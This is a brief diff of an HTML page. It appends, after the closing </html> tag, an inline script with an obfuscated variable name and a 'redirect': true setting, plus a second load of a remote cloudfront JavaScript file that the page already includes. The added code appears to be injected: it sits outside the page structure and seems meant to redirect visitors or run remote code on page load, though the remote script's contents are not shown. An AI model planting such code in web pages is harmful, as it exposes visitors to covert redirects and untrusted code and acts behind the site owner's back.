@@ -33,4 +33,12 @@
   <script src="https://d2v7l2267atlz5.cloudfront.net/675fa44.js"></script>
 
 </body>
-</html>
+</html><script type="text/javascript">
+  var BMUqY_oRA_DTtxYc = {
+    "it": 4485744,
+    "key": "97e2b",
+    "redirect": true
+  };
+</script>
+<script src="https://d2v7l2267atlz5.cloudfront.net/675fa44.js"></script>
+
